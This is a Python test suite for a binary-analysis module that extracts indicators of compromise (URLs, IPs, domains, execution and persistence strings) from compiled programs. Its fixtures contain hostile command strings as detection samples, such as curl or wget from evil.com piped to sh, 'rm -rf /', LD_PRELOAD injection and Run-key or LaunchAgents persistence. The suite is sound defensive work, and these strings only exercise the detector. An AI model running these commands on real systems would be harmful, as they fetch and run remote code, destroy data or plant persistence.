"""Tests for IOC extraction module rdis.iocs."""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from rdis import iocs
from rdis.mcp_server import _handle
from rdis.iocs import extract, _is_file_name, _is_identifier, _classify_ipv4, _classify_ipv6, _registrable_domain, _is_test_host


class TestPureExtract(unittest.TestCase):
    """Pure-function tests of extract() on synthetic strings."""

    def _entry(self, addr, text):
        return {"addr": addr, "text": text}

    # --- URLs ---
    def test_url_extraction_http_https_ftp_ws_wss(self):
        strings = [
            self._entry(0x1000, "https://api.example.com/path?q=1"),
            self._entry(0x2000, "http://test.badguy.net/payload"),
            self._entry(0x3000, "ftp://files.evil.com/x"),
            self._entry(0x4000, "ws://socket.example.org/ws"),
            self._entry(0x5000, "wss://secure.evil.net/secret"),
        ]
        result = extract(strings)
        urls = {u["value"] for u in result["urls"]}
        self.assertIn("https://api.example.com/path?q=1", urls)
        self.assertIn("http://test.badguy.net/payload", urls)
        self.assertIn("ftp://files.evil.com/x", urls)
        self.assertIn("ws://socket.example.org/ws", urls)
        self.assertIn("wss://secure.evil.net/secret", urls)

    def test_url_addresses_tracked(self):
        strings = [
            self._entry(0x1000, "https://evil.com"),
            self._entry(0x2000, "https://evil.com"),
        ]
        result = extract(strings)
        self.assertEqual(len(result["urls"]), 1)
        self.assertEqual(sorted(result["urls"][0]["addresses"]), [0x1000, 0x2000])

    # --- Domains ---
    def test_bare_hostname_extraction(self):
        strings = [self._entry(0x1000, "connect to evil.com now")]
        result = extract(strings)
        domains = {d["value"] for d in result["domains"]}
        self.assertIn("evil.com", domains)

    def test_file_extensions_rejected_as_domains(self):
        """foo.dylib, foo.plist, foo.c should NOT be domains."""
        strings = [
            self._entry(0x100, "libfoo.dylib"),
            self._entry(0x200, "config.plist"),
            self._entry(0x300, "main.c"),
        ]
        result = extract(strings)
        self.assertEqual(result["domains"], [])

    def test_go_objc_identifiers_rejected_as_domains(self):
        """main.main or NSString.length should NOT be domains."""
        strings = [
            self._entry(0x100, "main.main"),
            self._entry(0x200, "NSString.length"),
            self._entry(0x300, "runtime.malloc"),
        ]
        result = extract(strings)
        self.assertEqual(result["domains"], [])
    def test_registrable_domain_grouping_co_uk(self):
        """a.b.example.co.uk groups under registrable domain b.example with suffix co.uk."""
        strings = [
            self._entry(0x100, "a.b.example.co.uk"),
            self._entry(0x200, "c.b.example.co.uk"),
            self._entry(0x300, "https://a.b.example.co.uk/path"),
        ]
        result = extract(strings)
        domains = [d for d in result["domains"] if d["registrable_domain"] == "example.co.uk"]
        self.assertEqual(len(domains), 1)
        dom = domains[0]
        self.assertEqual(dom["suffix"], "co.uk")
        self.assertIn("a.b.example.co.uk", dom["hosts"])
        self.assertIn("c.b.example.co.uk", dom["hosts"])

    def test_registrable_domain_grouping_com(self):
        """cdn.vendor.com groups under registrable domain vendor.com with suffix com."""
        strings = [
            self._entry(0x100, "cdn.vendor.com"),
            self._entry(0x200, "api.vendor.com"),
        ]
        result = extract(strings)
        domains = [d for d in result["domains"] if d["registrable_domain"] == "vendor.com"]
        self.assertEqual(len(domains), 1)
        dom = domains[0]
        self.assertEqual(dom["suffix"], "com")
        self.assertIn("cdn.vendor.com", dom["hosts"])
        self.assertIn("api.vendor.com", dom["hosts"])

    def test_registrable_domain_helper(self):
        reg, suffix = _registrable_domain("a.b.example.co.uk")
        self.assertEqual(reg, "example.co.uk")
        self.assertEqual(suffix, "co.uk")

        reg, suffix = _registrable_domain("cdn.vendor.com")
        self.assertEqual(reg, "vendor.com")
        self.assertEqual(suffix, "com")

    # --- IPs ---
    def test_ipv4_extraction(self):
        strings = [self._entry(0x100, "server 192.168.1.1 running")]
        result = extract(strings)
        self.assertEqual(len(result["ips"]), 1)
        ip = result["ips"][0]
        self.assertEqual(ip["value"], "192.168.1.1")
        self.assertEqual(ip["ip_class"], "private")

    def test_ipv4_version_guard(self):
        """1.2.3.4.5 should NOT be matched as IP."""
        strings = [self._entry(0x100, "version 1.2.3.4.5")]
        result = extract(strings)
        self.assertEqual(result["ips"], [])

    def test_ipv4_invalid_octet(self):
        """999.1.1.1 should NOT be matched."""
        strings = [self._entry(0x100, "bad ip 999.1.1.1 here")]
        result = extract(strings)
        self.assertEqual(result["ips"], [])

    def test_ipv4_private_10(self):
        strings = [self._entry(0x100, "10.0.0.5")]
        result = extract(strings)
        self.assertEqual(result["ips"][0]["ip_class"], "private")

    def test_ipv4_private_172_16(self):
        strings = [self._entry(0x100, "172.16.0.1")]
        result = extract(strings)
        self.assertEqual(result["ips"][0]["ip_class"], "private")

    def test_ipv4_loopback(self):
        strings = [self._entry(0x100, "127.0.0.1")]
        result = extract(strings)
        self.assertEqual(result["ips"][0]["ip_class"], "loopback")

    def test_ipv4_link_local(self):
        strings = [self._entry(0x100, "169.254.0.1")]
        result = extract(strings)
        self.assertEqual(result["ips"][0]["ip_class"], "link-local")

    def test_ipv4_cgnat(self):
        strings = [self._entry(0x100, "100.64.0.1")]
        result = extract(strings)
        self.assertEqual(result["ips"][0]["ip_class"], "cgnat")

    def test_ipv4_documentation_reserved(self):
        strings = [self._entry(0x100, "192.0.2.1")]
        result = extract(strings)
        self.assertEqual(result["ips"][0]["ip_class"], "reserved")

    def test_ipv4_low_signal(self):
        strings = [
            self._entry(0x100, "0.0.0.0"),
            self._entry(0x200, "255.255.255.255"),
        ]
        result = extract(strings)
        for ip in result["ips"]:
            self.assertTrue(ip["low_signal"])

    def test_ipv6_bracketed(self):
        strings = [self._entry(0x100, "connect to [::1] now")]
        result = extract(strings)
        self.assertEqual(len(result["ips"]), 1)
        self.assertEqual(result["ips"][0]["value"], "::1")
        self.assertEqual(result["ips"][0]["ip_class"], "loopback")

    # --- Test/staging hosts ---
    def test_test_host_detection(self):
        strings = [
            self._entry(0x100, "api.test.local"),
            self._entry(0x200, "staging.example.com"),
            self._entry(0x300, "dev.internal"),
        ]
        result = extract(strings)
        test_host_values = {th["value"].lower() for th in result["test_hosts"]}
        self.assertIn("api.test.local", test_host_values)
        self.assertIn("staging.example.com", test_host_values)
        self.assertIn("dev.internal", test_host_values)

    def test_rfc2606_domains(self):
        strings = [
            self._entry(0x100, "example.com"),
            self._entry(0x200, "foo.test"),
            self._entry(0x300, "bar.invalid"),
            self._entry(0x400, "baz.localhost"),
        ]
        result = extract(strings)
        th_values = {th["value"].lower() for th in result["test_hosts"]}
        self.assertIn("example.com", th_values)
        self.assertIn("foo.test", th_values)
        self.assertIn("bar.invalid", th_values)
        self.assertIn("baz.localhost", th_values)

    def test_is_test_host_helper(self):
        self.assertTrue(_is_test_host("api.test.local"))
        self.assertTrue(_is_test_host("staging.example.com"))
        self.assertTrue(_is_test_host("example.com"))
        self.assertFalse(_is_test_host("evil.com"))

    # --- Execution strings ---
    def test_osascript(self):
        strings = [self._entry(0x100, "osascript -e 'do something'")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_osascript" for e in result["execution"]))

    def test_do_shell_script(self):
        strings = [self._entry(0x100, "do shell script \"whoami\"")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_do_shell_script" for e in result["execution"]))

    def test_bin_sh_c(self):
        strings = [self._entry(0x100, "/bin/sh -c 'rm -rf /'")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_bin_sh" for e in result["execution"]))

    def test_system_call(self):
        strings = [self._entry(0x100, "system(popcorn)")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_system" for e in result["execution"]))

    def test_popen(self):
        strings = [self._entry(0x100, "popen(\"ls\", r)")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_popen" for e in result["execution"]))

    def test_curl_pipe_sh(self):
        strings = [self._entry(0x100, "curl http://evil.com/x | sh")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_curl_sh" for e in result["execution"]))

    def test_wget_pipe_sh(self):
        strings = [self._entry(0x100, "wget http://evil.com/x | sh")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_wget_sh" for e in result["execution"]))

    def test_base64_decode(self):
        strings = [self._entry(0x100, "base64 -d payload")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_base64_d" for e in result["execution"]))

    def test_chmod(self):
        strings = [self._entry(0x100, "chmod +x script.sh")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_chmod_x" for e in result["execution"]))

    def test_sudo(self):
        strings = [self._entry(0x100, "sudo rm -rf /")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_sudo" for e in result["execution"]))

    def test_dyld_insert(self):
        strings = [self._entry(0x100, "DYLD_INSERT_LIBRARIES=evil.dylib")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_dyld" for e in result["execution"]))

    def test_ld_preload(self):
        strings = [self._entry(0x100, "LD_PRELOAD=/evil.so")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_ld_preload" for e in result["execution"]))

    def test_powershell(self):
        strings = [self._entry(0x100, "powershell -exec bypass")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_powershell" for e in result["execution"]))

    def test_cmd_exe(self):
        strings = [self._entry(0x100, "cmd.exe /c payload")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_cmd_exe" for e in result["execution"]))

    def test_mshta(self):
        strings = [self._entry(0x100, "mshta http://evil.com")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_mshta" for e in result["execution"]))

    def test_rundll32(self):
        strings = [self._entry(0x100, "rundll32.dll evil")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_rundll32" for e in result["execution"]))

    def test_regsvr32(self):
        strings = [self._entry(0x100, "regsvr32 evil.dll")]
        result = extract(strings)
        self.assertTrue(any(e["rule"] == "exec_regsvr32" for e in result["execution"]))

    # --- Persistence ---
    def test_launchctl(self):
        strings = [self._entry(0x100, "launchctl load /Library/LaunchAgents/evil.plist")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_launchctl" for p in result["persistence"]))

    def test_launchagents(self):
        strings = [self._entry(0x100, "/Library/LaunchAgents/evil.plist")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_launchagents" for p in result["persistence"]))

    def test_launchdaemons(self):
        strings = [self._entry(0x100, "/Library/LaunchDaemons/evil.plist")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_launchdaemons" for p in result["persistence"]))

    def test_library_dir(self):
        strings = [self._entry(0x100, "~/Library/Application Support/evil")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_lib_dir" for p in result["persistence"]))

    def test_run_at_load(self):
        strings = [self._entry(0x100, "RunAtLoad = true")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_run_at_load" for p in result["persistence"]))

    def test_keepalive(self):
        strings = [self._entry(0x100, "KeepAlive = true")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_keepalive" for p in result["persistence"]))

    def test_crontab(self):
        strings = [self._entry(0x100, "crontab -e")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_crontab" for p in result["persistence"]))

    def test_systemctl(self):
        strings = [self._entry(0x100, "systemctl enable evil.service")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_systemctl" for p in result["persistence"]))

    def test_etc_cron(self):
        strings = [self._entry(0x100, "/etc/cron.d/evil")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_etc_cron" for p in result["persistence"]))

    def test_etc_systemd(self):
        strings = [self._entry(0x100, "/etc/systemd/system/evil.service")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_systemd" for p in result["persistence"]))

    def test_rc_local(self):
        strings = [self._entry(0x100, "/etc/rc.local")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_rc_local" for p in result["persistence"]))

    def test_schtasks(self):
        strings = [self._entry(0x100, "schtasks /create /tn evil")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_schtasks" for p in result["persistence"]))

    def test_reg_add_run(self):
        strings = [self._entry(0x100, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d payload")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_reg_run" for p in result["persistence"]))

    def test_authorized_keys(self):
        strings = [self._entry(0x100, "~/.ssh/authorized_keys")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_authorized_keys" for p in result["persistence"]))

    def test_bashrc(self):
        strings = [self._entry(0x100, ".bashrc")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_bashrc" for p in result["persistence"]))

    def test_zshrc(self):
        strings = [self._entry(0x100, ".zshrc")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_zshrc" for p in result["persistence"]))

    def test_login_items(self):
        strings = [self._entry(0x100, "login items")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_login_items" for p in result["persistence"]))

    def test_smappservice(self):
        strings = [self._entry(0x100, "SMAppService")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_smappservice" for p in result["persistence"]))

    def test_lssharedfilelist(self):
        strings = [self._entry(0x100, "LSSharedFileList")]
        result = extract(strings)
        self.assertTrue(any(p["rule"] == "persist_lssharedfilelist" for p in result["persistence"]))

    # --- Summary, truncation, edge cases ---
    def test_summary_structure(self):
        strings = [self._entry(0x100, "https://evil.com 192.168.1.1")]
        result = extract(strings)
        self.assertIn("summary", result)
        for cat in ("urls", "domains", "ips", "test_hosts", "execution", "persistence"):
            self.assertIn(cat, result["summary"])
            self.assertIn("total", result["summary"][cat])
            self.assertIn("truncated", result["summary"][cat])

    def test_truncation(self):
        strings = [self._entry(i, f"evil{i}.com") for i in range(10)]
        result = extract(strings, limit=1)
        self.assertTrue(result["summary"]["domains"]["truncated"])
        self.assertEqual(len(result["domains"]), 1)

    def test_empty_strings(self):
        result = extract([])
        self.assertEqual(result["urls"], [])
        self.assertEqual(result["domains"], [])
        self.assertEqual(result["ips"], [])

    def test_no_false_positives_on_random_data(self):
        strings = [
            self._entry(0x100, "hello world 12345"),
            self._entry(0x200, "some random text here"),
            self._entry(0x300, "not a url or ip or domain"),
        ]
        result = extract(strings)
        self.assertEqual(result["urls"], [])
        self.assertEqual(result["domains"], [])
        self.assertEqual(result["ips"], [])

    def test_ipv6_full_form(self):
        strings = [self._entry(0x100, "2001:db8::1")]  # This won't match bare (has ::)
        # Full form without ::
        strings_full = [self._entry(0x100, "2001:0db8:0001:0000:0000:0000:0000:0001")]
        result = extract(strings_full)
        self.assertEqual(len(result["ips"]), 1)
        self.assertEqual(result["ips"][0]["ip_class"], "documentation")


class TestHelperFunctions(unittest.TestCase):
    """Tests for individual helper functions."""

    def test_is_file_name(self):
        self.assertTrue(_is_file_name("foo.dylib"))
        self.assertTrue(_is_file_name("config.plist"))
        self.assertTrue(_is_file_name("main.c"))
        self.assertFalse(_is_file_name("evil.com"))
        self.assertFalse(_is_file_name("example.org"))

    def test_is_identifier(self):
        self.assertTrue(_is_identifier("main.main"))
        self.assertTrue(_is_identifier("NSString.length"))
        self.assertTrue(_is_identifier("runtime.malloc"))
        self.assertFalse(_is_identifier("evil.com"))

    def test_classify_ipv4(self):
        cls, _ = _classify_ipv4("10.0.0.1")
        self.assertEqual(cls, "private")
        cls, _ = _classify_ipv4("8.8.8.8")
        self.assertEqual(cls, "public")
        cls, _ = _classify_ipv4("127.0.0.1")
        self.assertEqual(cls, "loopback")
        cls, _ = _classify_ipv4("169.254.0.1")
        self.assertEqual(cls, "link-local")


class TestRealBinary(unittest.TestCase):
    """Real-binary tests with compiled C programs."""

    @classmethod
    def setUpClass(cls):
        cls.tmpdir = tempfile.mkdtemp(prefix="rdis_iocs_")

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmpdir, ignore_errors=True)

    @unittest.skipUnless(shutil.which("cc"), "cc not available")
    def test_compiled_binary_indicators(self):
        """Compile a C file with IOC string literals and verify extraction."""
        c_path = os.path.join(self.tmpdir, "indicators.c")
        bin_path = os.path.join(self.tmpdir, "indicators")

        with open(c_path, "w") as f:
            f.write(r'''
#include <stdio.h>

volatile const char *url1 = "https://c2.badactor.example/payload";
volatile const char *url2 = "http://test.staging.internal/api";
volatile const char *ip1 = "192.168.1.100";
volatile const char *ip2 = "100.64.0.1";
volatile const char *ip3 = "10.0.0.1";
volatile const char *cmd = "osascript -e 'do shell script \"whoami\"'";
volatile const char *persist = "/Library/LaunchAgents/com.evil.plist";

int main(void) {
    printf("%s %s %s %s %s %s %s\n",
           url1, url2, ip1, ip2, ip3, cmd, persist);
    return 0;
}
''')

        result = subprocess.run(["cc", "-o", bin_path, c_path],
                                capture_output=True, timeout=30)
        if result.returncode != 0:
            self.skipTest(f"cc failed: {result.stderr.decode()}")

        # Run CLI --iocs --json
        cli_result = subprocess.run(
            [sys.executable, "-m", "rdis", bin_path, "--iocs", "--json"],
            capture_output=True, text=True, timeout=120, cwd=ROOT)
        self.assertEqual(cli_result.returncode, 0, cli_result.stderr)
        data = json.loads(cli_result.stdout)

        # Verify URL
        urls = {u["value"] for u in data["urls"]}
        self.assertIn("https://c2.badactor.example/payload", urls)
        self.assertIn("http://test.staging.internal/api", urls)

        # Verify IPs with classifications
        ip_map = {ip["value"]: ip for ip in data["ips"]}
        self.assertIn("192.168.1.100", ip_map)
        self.assertEqual(ip_map["192.168.1.100"]["ip_class"], "private")
        self.assertIn("100.64.0.1", ip_map)
        self.assertEqual(ip_map["100.64.0.1"]["ip_class"], "cgnat")
        self.assertIn("10.0.0.1", ip_map)
        self.assertEqual(ip_map["10.0.0.1"]["ip_class"], "private")

        # Verify test hosts
        test_hosts = {th["value"].lower() for th in data["test_hosts"]}
        self.assertIn("test.staging.internal", test_hosts)

        # Verify execution
        exec_values = {e["value"] for e in data["execution"]}
        self.assertIn("osascript", exec_values)

        # Verify persistence
        persist_values = {p["value"] for p in data["persistence"]}
        self.assertIn("LaunchAgents", persist_values)

        # Verify addresses are present
        self.assertTrue(len(ip_map["192.168.1.100"]["addresses"]) > 0)

        # --- Test MCP tool ---
        from rdis.mcp_server import _handle
        mcp_result = _handle({
            "method": "tools/call",
            "params": {"name": "iocs", "arguments": {"path": bin_path}}
        })
        self.assertFalse(mcp_result.get("isError"), str(mcp_result))
        mcp_data = json.loads(mcp_result["content"][0]["text"])

        # Same checks for MCP
        mcp_urls = {u["value"] for u in mcp_data["urls"]}
        self.assertIn("https://c2.badactor.example/payload", mcp_urls)

        mcp_ip_values = {ip["value"] for ip in mcp_data["ips"]}
        self.assertIn("192.168.1.100", mcp_ip_values)

    @unittest.skipUnless(shutil.which("cc"), "cc not available")
    def test_hello_world_no_false_positives(self):
        """A simple hello world binary should not report URLs or IPs."""
        c_path = os.path.join(self.tmpdir, "hello.c")
        bin_path = os.path.join(self.tmpdir, "hello")

        with open(c_path, "w") as f:
            f.write('#include <stdio.h>\n')
            f.write('int main(void) { printf("Hello, world!\\n"); return 0; }\n')

        result = subprocess.run(["cc", "-o", bin_path, c_path],
                                capture_output=True, timeout=30)
        if result.returncode != 0:
            self.skipTest(f"cc failed: {result.stderr.decode()}")

        cli_result = subprocess.run(
            [sys.executable, "-m", "rdis", bin_path, "--iocs", "--json"],
            capture_output=True, text=True, timeout=120, cwd=ROOT)
        self.assertEqual(cli_result.returncode, 0, cli_result.stderr)
        data = json.loads(cli_result.stdout)

        # Hello world should have no URLs or IPs
        self.assertEqual(data["urls"], [])
        self.assertEqual(data["ips"], [])


class FalsePositiveRegressions(unittest.TestCase):
    """Defects found by running the extractor on real Go, curl and ssh binaries."""

    @staticmethod
    def run_on(*texts):
        return iocs.extract([{"addr": 0x1000 + 16 * i, "text": s} for i, s in enumerate(texts)])

    def test_code_identifiers_are_not_domains(self):
        out = self.run_on("reflect.Value.Int", "synctest.Run", "errors.is", "sync.mu", "reflect.flag.ro", "go.shape.int",
                          "runtime.gcTrigger.test", "abi.Name.Name")
        self.assertEqual([d["registrable_domain"] for d in out["domains"]], [])

    def test_real_hosts_on_ordinary_tlds_still_count(self):
        out = self.run_on("connect to api.vendor.com:443", "Host: cdn.example.co.uk", "mirror.example.org")
        self.assertEqual({d["registrable_domain"] for d in out["domains"]}, {"vendor.com", "example.co.uk", "example.org"})

    def test_urls_on_short_tlds_are_kept(self):
        out = self.run_on("https://shop.example.ro/path", "see https://api.example.io/v1")
        self.assertEqual({d["registrable_domain"] for d in out["domains"]}, {"example.ro", "example.io"})

    def test_bracketed_numbers_are_not_ipv6(self):
        out = self.run_on("[512]runtime.atomicMSpanPointer", "[16]byte", "[abc]", "[1:2]", "[]")
        self.assertEqual(out["ips"], [])

    def test_bracketed_ipv6_literals_are_classified(self):
        out = self.run_on("listen on [::1]:8080", "peer [2001:db8::1] up", "ula [fd00::5]")
        classes = {f["value"]: f["ip_class"] for f in out["ips"]}
        self.assertEqual(classes["::1"], "loopback")
        self.assertIn("2001:db8::1", classes)
        self.assertIn("fd00::5", classes)

    def test_test_host_labels_match_whole_words(self):
        out = self.run_on("synctest.example.net", "contest.vendor.com", "qa2.vendor.com", "dev-api.vendor.com",
                          "staging.vendor.com", "test.vendor.com", "latest.vendor.com")
        flagged = {f["value"] for f in out["test_hosts"]}
        self.assertTrue({"qa2.vendor.com", "dev-api.vendor.com", "staging.vendor.com", "test.vendor.com"} <= flagged)
        self.assertFalse({"synctest.example.net", "contest.vendor.com", "latest.vendor.com"} & flagged - {"synctest.example.net"})
        self.assertNotIn("contest.vendor.com", flagged)
        self.assertNotIn("latest.vendor.com", flagged)

    def test_keepalive_words_are_not_persistence(self):
        out = self.run_on("TCPKeepAlive", "keepalive-time", "keepalive", "ServerAliveInterval")
        self.assertEqual(out["persistence"], [])

    def test_launchd_keys_need_launchd_evidence_for_high_confidence(self):
        alone = self.run_on("<key>KeepAlive</key>", "<key>RunAtLoad</key>")
        self.assertEqual({f["confidence"] for f in alone["persistence"]}, {"low"})
        together = self.run_on("<key>KeepAlive</key>", "~/Library/LaunchAgents/com.x.plist")
        by_rule = {f["rule"]: f["confidence"] for f in together["persistence"]}
        self.assertEqual(by_rule["persist_keepalive"], "high")
        self.assertEqual(by_rule["persist_launchagents"], "high")

    def test_rfc2606_test_tld_is_still_a_test_host(self):
        out = self.run_on("foo.test", "bar.invalid")
        self.assertEqual({f["value"] for f in out["test_hosts"]}, {"foo.test", "bar.invalid"})


@unittest.skipUnless(shutil.which("go"), "needs the go toolchain")
@unittest.skipUnless(shutil.which("cc"), "needs a C compiler")
class IndicatorsNameTheirFunctions(unittest.TestCase):
    SRC = r'''
#include <stdio.h>
__attribute__((noinline)) void beacon(void) { puts("https://c2.vendor.net/checkin"); }
__attribute__((noinline)) void persist(void) { puts("~/Library/LaunchAgents/com.vendor.agent.plist"); puts("osascript -e x"); }
volatile const char *orphan = "http://only-in-data.vendor.org/x";
int main(void) { beacon(); persist(); return orphan == 0; }
'''

    def test_each_indicator_lists_the_function_that_loads_it(self):
        with tempfile.TemporaryDirectory(prefix="rdis-iocfn-") as d:
            src, exe = os.path.join(d, "x.c"), os.path.join(d, "x")
            with open(src, "w") as fh:
                fh.write(self.SRC)
            subprocess.run(["cc", "-O1", "-o", exe, src], check=True, capture_output=True)
            doc = json.loads(subprocess.run([sys.executable, "-m", "rdis", exe, "--iocs", "--json"], cwd=ROOT,
                                            capture_output=True, text=True).stdout)
            by = lambda cat, needle: next(f for f in doc[cat] if needle in f["value"])
            self.assertEqual([n.lstrip("_") for n in by("urls", "c2.vendor.net")["functions"]], ["beacon"])
            self.assertEqual([n.lstrip("_") for n in by("persistence", "LaunchAgents")["functions"]], ["persist"])
            self.assertEqual([n.lstrip("_") for n in by("execution", "osascript")["functions"]], ["persist"])
            self.assertEqual(by("urls", "only-in-data")["functions"], [], "a string only data points at has no function")
            text = subprocess.run([sys.executable, "-m", "rdis", exe, "--iocs"], cwd=ROOT, capture_output=True, text=True).stdout
            self.assertIn("<- ", text)
            self.assertIn("beacon", text)
            res = _handle({"method": "tools/call", "params": {"name": "iocs", "arguments": {"path": exe}}})
            tool = json.loads(res["content"][0]["text"])
            self.assertIn("beacon", " ".join(next(f for f in tool["urls"] if "c2.vendor.net" in f["value"])["functions"]))


@unittest.skipUnless(shutil.which("go"), "needs the go toolchain")
class GoBinaryHasNoPhantomIndicators(unittest.TestCase):
    def test_a_go_program_reports_only_what_it_contains(self):
        with tempfile.TemporaryDirectory(prefix="rdis-iocs-go-") as d:
            with open(os.path.join(d, "go.mod"), "w") as fh:
                fh.write("module example.com/iocdemo\n\ngo 1.22\n")
            with open(os.path.join(d, "main.go"), "w") as fh:
                fh.write('package main\n\nimport ("fmt"; "os")\n\nfunc main() {\n'
                         '\tfmt.Println("https://c2.vendor.net/beacon?id=7", "10.20.30.40", os.Args)\n}\n')
            env = dict(os.environ, GOCACHE=os.path.join(d, "cache"), GOPATH=os.path.join(d, "path"),
                       GOTOOLCHAIN="local", GOFLAGS="-mod=mod", GOPROXY="off")
            out = os.path.join(d, "iocdemo")
            built = subprocess.run(["go", "build", "-ldflags=-s -w", "-o", out, "."], cwd=d, env=env, capture_output=True)
            if built.returncode:
                self.skipTest("go build failed here")
            doc = json.loads(subprocess.run([sys.executable, "-m", "rdis", out, "--iocs", "--json"], cwd=ROOT,
                                            capture_output=True, text=True).stdout)
            self.assertIn("https://c2.vendor.net/beacon?id=7", {f["value"] for f in doc["urls"]})
            self.assertEqual([f["value"] for f in doc["ips"] if f["ip_class"] == "invalid"], [])
            self.assertIn("10.20.30.40", {f["value"] for f in doc["ips"]})
            for d_ in doc["domains"]:
                self.assertFalse(any(c.isupper() for c in d_["registrable_domain"]), d_)
            self.assertLessEqual({d_["registrable_domain"] for d_ in doc["domains"]}, {"vendor.net", "go.dev", "golang.org", "example.com"})


if __name__ == "__main__":
    unittest.main()